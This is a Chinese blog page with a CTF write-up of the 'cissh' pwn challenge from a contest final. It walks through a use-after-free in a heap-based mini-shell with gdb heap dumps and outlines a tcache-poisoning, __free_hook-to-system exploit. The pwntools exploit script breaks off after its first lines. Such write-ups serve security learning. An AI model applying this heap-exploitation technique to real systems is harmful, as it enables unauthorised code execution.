@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.1p0ch.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="国赛终于打完辣，👴可以退役了。中午比完一看，三个队78，79，80，👴直接人生有梦各自精彩，然后最后一小时三道可信计算疯狂上分，最后比完两个国一，一个国二，过于刺激。👴只想说，可信计算，yyds！这里记录一下第二天的cissh的pwn&amp;patch，这题pwn没啥好说的，只是c++难看了点，uaf直接打就完事，patch的话👴一个小时没patch出来（主要还是c++太难看了），所以赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="国赛决赛awd+的cissh的pwn&amp;patch">
+<meta property="og:url" content="https://www.1p0ch.cn/2021/07/21/%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bawd+%E4%B9%8Bcissh%E4%B9%8Bpatch/index.html">
+<meta property="og:site_name" content="1p0ch">
+<meta property="og:description" content="国赛终于打完辣，👴可以退役了。中午比完一看，三个队78，79，80，👴直接人生有梦各自精彩，然后最后一小时三道可信计算疯狂上分，最后比完两个国一，一个国二，过于刺激。👴只想说，可信计算，yyds！这里记录一下第二天的cissh的pwn&amp;patch，这题pwn没啥好说的，只是c++难看了点，uaf直接打就完事，patch的话👴一个小时没patch出来（主要还是c++太难看了），所以赛">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-07-21T07:40:31.000Z">
+<meta property="article:modified_time" content="2021-07-21T08:19:57.212Z">
+<meta property="article:author" content="1p0ch">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="国赛决赛">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://www.1p0ch.cn/2021/07/21/%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bawd+%E4%B9%8Bcissh%E4%B9%8Bpatch/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>国赛决赛awd+的cissh的pwn&patch | 1p0ch</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?3e91822f891be643bcea09697706aabd";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">1p0ch</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.1p0ch.cn/2021/07/21/%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bawd+%E4%B9%8Bcissh%E4%B9%8Bpatch/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=765986760&spec=160">
+      <meta itemprop="name" content="1p0ch">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1p0ch">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          国赛决赛awd+的cissh的pwn&patch
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-07-21 15:40:31 / 修改时间：16:19:57" itemprop="dateCreated datePublished" datetime="2021-07-21T15:40:31+08:00">2021-07-21</time>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>国赛终于打完辣，👴可以退役了。中午比完一看，三个队78，79，80，👴直接人生有梦各自精彩，然后最后一小时三道可信计算疯狂上分，最后比完两个国一，一个国二，过于刺激。👴只想说，可信计算，yyds！<br>这里记录一下第二天的cissh的pwn&amp;patch，这题pwn没啥好说的，只是c++难看了点，uaf直接打就完事，patch的话👴一个小时没patch出来（主要还是c++太难看了），所以赛后重新patch了下，顺便记录下c++该怎么patch。</p>
+<a id="more"></a> 
+
+<h2 id="cissh"><a href="#cissh" class="headerlink" title="cissh"></a>cissh</h2><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>简单测试下程序功能，有ls，ln，vi，touch，cat，rm功能，相当于用堆实现了部分shell的功能，然后我们直接进行一个初步测试，touch会申请堆块存储文件，ls能列出文件，cat，vi，rm功能都同shell中相同，但是都是基于堆实现了，这里我们发现ln可以将文件a指向文件b的文件内容，free b后，b指向的文件内容堆地址已经被free了，但是仍然可以通过对a的访问和编辑来修改b指向的文件内容，从而导致了uaf。利用这个uaf可以泄露libc基址，然后打tcache从而打到free_hook上，改写成system从而获得shell，进而获得flag。</p>
+<p>具体的数据说明如下：</p>
+<p>堆记录数据结构：</p>
+<p>file type有file和link</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x55c05c5e2370</span></span><br><span class="line"><span class="number">0x55c05c5e2370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span></span><br><span class="line">    			<span class="comment">#addr_to_exe1</span></span><br><span class="line"><span class="number">0x55c05c5e2380</span>:	<span class="number">0x000055c05c49aae0</span>	<span class="number">0x0000000100000001</span></span><br><span class="line">     			<span class="comment">#addr to file name	file name size</span></span><br><span class="line"><span class="number">0x55c05c5e2390</span>:	<span class="number">0x000055c05c5e23a0</span>	<span class="number">0x0000000000000004</span></span><br><span class="line">     			<span class="comment">#file name</span></span><br><span class="line"><span class="number">0x55c05c5e23a0</span>:	<span class="number">0x0000000063636363</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			<span class="comment">#ptr to addr_file_content</span></span><br><span class="line"><span class="number">0x55c05c5e23b0</span>:	<span class="number">0x000055c05c5e2270</span>	<span class="number">0x000055c05c5e23f0</span></span><br><span class="line">    			<span class="comment">#addr to file type	file type size</span></span><br><span class="line"><span class="number">0x55c05c5e23c0</span>:	<span class="number">0x000055c05c5e23d0</span>	<span class="number">0x0000000000000004</span></span><br><span class="line">    			<span class="comment">#file type</span></span><br><span class="line"><span class="number">0x55c05c5e23d0</span>:	<span class="number">0x000000006b6e696c</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c05c5e23e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line">    			<span class="comment">#ptr to addr_to_exe3</span></span><br><span class="line"><span class="number">0x55c05c5e23f0</span>:	<span class="number">0x000055c05c49ab50</span>	<span class="number">0x0000000100000001</span></span><br><span class="line">    			<span class="comment">#ptr to addr_file_content</span></span><br><span class="line"><span class="number">0x55c05c5e2400</span>:	<span class="number">0x000055c05c5e2270</span>	<span class="number">0x000000000000ec01</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope <span class="number">0x55c05c5e2370</span></span><br><span class="line">0000| 0x55c05c5e2370 --&gt; 0x0 </span><br><span class="line">0008| 0x55c05c5e2378 --&gt; 0x71 ('q')</span><br><span class="line">0016| 0x55c05c5e2380 --&gt; 0x55c05c49aae0 --&gt; 0x55c05c4931d4 (&lt;_ZNSt23_Sp_counted_ptr_inplaceI4FileSaIS0_ELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0024| 0x55c05c5e2388 --&gt; 0x100000001 </span><br><span class="line">0032| 0x55c05c5e2390 --&gt; 0x55c05c5e23a0 --&gt; 0x63636363 ('cccc')</span><br><span class="line">0040| 0x55c05c5e2398 --&gt; 0x4 </span><br><span class="line">0048| 0x55c05c5e23a0 --&gt; 0x63636363 ('cccc')</span><br><span class="line">0056| 0x55c05c5e23a8 --&gt; 0x0 </span><br><span class="line">gdb-peda$ telescope <span class="number">0x55c05c5e2370</span> <span class="number">30</span></span><br><span class="line">0000| 0x55c05c5e2370 --&gt; 0x0 </span><br><span class="line">0008| 0x55c05c5e2378 --&gt; 0x71 ('q')</span><br><span class="line">0016| 0x55c05c5e2380 --&gt; 0x55c05c49aae0 --&gt; 0x55c05c4931d4 (&lt;_ZNSt23_Sp_counted_ptr_inplaceI4FileSaIS0_ELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0024| 0x55c05c5e2388 --&gt; 0x100000001 </span><br><span class="line">0032| 0x55c05c5e2390 --&gt; 0x55c05c5e23a0 --&gt; 0x63636363 ('cccc')</span><br><span class="line">0040| 0x55c05c5e2398 --&gt; 0x4 </span><br><span class="line">0048| 0x55c05c5e23a0 --&gt; 0x63636363 ('cccc')</span><br><span class="line">0056| 0x55c05c5e23a8 --&gt; 0x0 </span><br><span class="line">0064| 0x55c05c5e23b0 --&gt; 0x55c05c5e2270 --&gt; 0x55c05c5e22c0 ("asdfasdfasdfasdf")</span><br><span class="line">0072| 0x55c05c5e23b8 --&gt; 0x55c05c5e23f0 --&gt; 0x55c05c49ab50 --&gt; 0x55c05c492fcc (&lt;_ZNSt15_Sp_counted_ptrIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0080| 0x55c05c5e23c0 --&gt; 0x55c05c5e23d0 --&gt; 0x6b6e696c ('link')</span><br><span class="line">0088| 0x55c05c5e23c8 --&gt; 0x4 </span><br><span class="line">0096| 0x55c05c5e23d0 --&gt; 0x6b6e696c ('link')</span><br><span class="line">0104| 0x55c05c5e23d8 --&gt; 0x0 </span><br><span class="line">0112| 0x55c05c5e23e0 --&gt; 0x0 </span><br><span class="line">0120| 0x55c05c5e23e8 --&gt; 0x21 ('!')</span><br><span class="line">0128| 0x55c05c5e23f0 --&gt; 0x55c05c49ab50 --&gt; 0x55c05c492fcc (&lt;_ZNSt15_Sp_counted_ptrIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0136| 0x55c05c5e23f8 --&gt; 0x100000001 </span><br><span class="line">0144| 0x55c05c5e2400 --&gt; 0x55c05c5e2270 --&gt; 0x55c05c5e22c0 ("asdfasdfasdfasdf")</span><br><span class="line">0152| 0x55c05c5e2408 --&gt; 0xec01</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x55c05c5e21e0</span></span><br><span class="line"><span class="number">0x55c05c5e21e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span>	<span class="comment">#freed after rm dddd</span></span><br><span class="line">    			<span class="comment">#addr_to_exe1</span></span><br><span class="line"><span class="number">0x55c05c5e21f0</span>:	<span class="number">0x000055c05c49aae0</span>	<span class="number">0x0000000100000001</span></span><br><span class="line">    			<span class="comment">#addr to file name	file name size</span></span><br><span class="line"><span class="number">0x55c05c5e2200</span>:	<span class="number">0x000055c05c5e2210</span>	<span class="number">0x0000000000000004</span></span><br><span class="line">    			<span class="comment">#file name</span></span><br><span class="line"><span class="number">0x55c05c5e2210</span>:	<span class="number">0x0000000064646464</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			<span class="comment">#ptr to addr_file_content</span></span><br><span class="line"><span class="number">0x55c05c5e2220</span>:	<span class="number">0x000055c05c5e2270</span>	<span class="number">0x000055c05c5e2260</span></span><br><span class="line">    			<span class="comment">#addr to file type	file type size</span></span><br><span class="line"><span class="number">0x55c05c5e2230</span>:	<span class="number">0x000055c05c5e2240</span>	<span class="number">0x0000000000000004</span></span><br><span class="line">				<span class="comment">#file type</span></span><br><span class="line"><span class="number">0x55c05c5e2240</span>:	<span class="number">0x00000000656c6966</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    </span><br><span class="line"><span class="number">0x55c05c5e2250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span>   <span class="comment">#freed after rm dddd</span></span><br><span class="line">    			<span class="comment">#addr_to_exe2</span></span><br><span class="line"><span class="number">0x55c05c5e2260</span>:	<span class="number">0x000055c05c49ab18</span>	<span class="number">0x0000000100000001</span></span><br><span class="line">    			<span class="comment">#addr_file_content	content_length</span></span><br><span class="line"><span class="number">0x55c05c5e2270</span>:	<span class="number">0x000055c05c5e22c0</span>	<span class="number">0x0000000000000010</span></span><br><span class="line"><span class="number">0x55c05c5e2280</span>:	<span class="number">0x000000000000001e</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    </span><br><span class="line"><span class="number">0x55c05c5e2290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span>	<span class="comment">#freed after rm dddd</span></span><br><span class="line"><span class="number">0x55c05c5e22a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000055c05c5d0010</span></span><br><span class="line">    </span><br><span class="line"><span class="number">0x55c05c5e22b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span>	<span class="comment">#freed after rm dddd</span></span><br><span class="line">    			<span class="comment">#file_content</span></span><br><span class="line"><span class="number">0x55c05c5e22c0</span>:	<span class="number">0x6664736166647361</span>	<span class="number">0x6664736166647361</span></span><br><span class="line"><span class="number">0x55c05c5e22d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c05c5e22e0</span>:	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope <span class="number">0x55c05c5e21e0</span> <span class="number">30</span></span><br><span class="line">0000| 0x55c05c5e21e0 --&gt; 0x0 </span><br><span class="line">0008| 0x55c05c5e21e8 --&gt; 0x71 ('q')</span><br><span class="line">0016| 0x55c05c5e21f0 --&gt; 0x55c05c49aae0 --&gt; 0x55c05c4931d4 (&lt;_ZNSt23_Sp_counted_ptr_inplaceI4FileSaIS0_ELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0024| 0x55c05c5e21f8 --&gt; 0x100000001 </span><br><span class="line">0032| 0x55c05c5e2200 --&gt; 0x55c05c5e2210 --&gt; 0x64646464 ('dddd')</span><br><span class="line">0040| 0x55c05c5e2208 --&gt; 0x4 </span><br><span class="line">0048| 0x55c05c5e2210 --&gt; 0x64646464 ('dddd')</span><br><span class="line">0056| 0x55c05c5e2218 --&gt; 0x0 </span><br><span class="line">0064| 0x55c05c5e2220 --&gt; 0x55c05c5e2270 --&gt; 0x55c05c5e22c0 ("asdfasdfasdfasdf")</span><br><span class="line">0072| 0x55c05c5e2228 --&gt; 0x55c05c5e2260 --&gt; 0x55c05c49ab18 --&gt; 0x55c05c49337e (&lt;_ZNSt23_Sp_counted_ptr_inplaceINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_ELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0080| 0x55c05c5e2230 --&gt; 0x55c05c5e2240 --&gt; 0x656c6966 ('file')</span><br><span class="line">0088| 0x55c05c5e2238 --&gt; 0x4 </span><br><span class="line">0096| 0x55c05c5e2240 --&gt; 0x656c6966 ('file')</span><br><span class="line">0104| 0x55c05c5e2248 --&gt; 0x0 </span><br><span class="line">0112| 0x55c05c5e2250 --&gt; 0x0 </span><br><span class="line">0120| 0x55c05c5e2258 --&gt; 0x41 ('A')</span><br><span class="line">0128| 0x55c05c5e2260 --&gt; 0x55c05c49ab18 --&gt; 0x55c05c49337e (&lt;_ZNSt23_Sp_counted_ptr_inplaceINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_ELN9__gnu_cxx12_Lock_policyE2EED2Ev&gt;:	endbr64)</span><br><span class="line">0136| 0x55c05c5e2268 --&gt; 0x100000001 </span><br><span class="line">0144| 0x55c05c5e2270 --&gt; 0x55c05c5e22c0 ("asdfasdfasdfasdf")</span><br><span class="line">0152| 0x55c05c5e2278 --&gt; 0x10 </span><br><span class="line">0160| 0x55c05c5e2280 --&gt; 0x1e </span><br><span class="line">0168| 0x55c05c5e2288 --&gt; 0x0 </span><br><span class="line">0176| 0x55c05c5e2290 --&gt; 0x0 </span><br><span class="line">0184| 0x55c05c5e2298 --&gt; 0x21 ('!')</span><br><span class="line">0192| 0x55c05c5e22a0 --&gt; 0x0 </span><br><span class="line">--More--(<span class="number">25</span>/<span class="number">30</span>)x/<span class="number">50</span>i <span class="number">0x55c05c49337e</span></span><br><span class="line">0200| 0x55c05c5e22a8 --&gt; 0x55c05c5d0010 --&gt; 0x1000000000001 </span><br><span class="line">0208| 0x55c05c5e22b0 --&gt; 0x0 </span><br><span class="line">0216| 0x55c05c5e22b8 --&gt; 0x31 ('1')</span><br><span class="line"><span class="number">0224</span>| <span class="number">0x55c05c5e22c0</span> (<span class="string">"asdfasdfasdfasdf"</span>)</span><br><span class="line"><span class="number">0232</span>| <span class="number">0x55c05c5e22c8</span> (<span class="string">"asdfasdf"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>free后</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x20</span> [  <span class="number">1</span>]: <span class="number">0x5555555792a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span> [  <span class="number">1</span>]: <span class="number">0x5555555792c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x555555579260</span> ◂— <span class="number">0x0</span>  <span class="comment">#这里存放着指向content的地址，仍然可用</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x5555555791a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">1</span>]: <span class="number">0x5555555791f0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+
+<p>free后再次vi cccc可以修改原来的堆的fd指向</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">5</span>]: <span class="number">0x555555579600</span> ◂— <span class="string">'ffffffff'</span>	<span class="comment">#这里已经变成了我们ffffffff写入的地址，即fd可控了</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">4</span>]: <span class="number">0x555555579590</span> —▸ <span class="number">0x555555579490</span> —▸ <span class="number">0x555555579380</span> —▸ <span class="number">0x555555579260</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">2</span>]: <span class="number">0x5555555791a0</span> —▸ <span class="number">0x5555555794d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">3</span>]: <span class="number">0x555555579520</span> —▸ <span class="number">0x555555579310</span> —▸ <span class="number">0x5555555791f0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+
+<p>然后这就是本题的漏洞点uaf了，接下来怎么打就不用我多说了。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># Created on 7月-18-21 08:20</span></span><br><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># @author: 1p0ch</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span 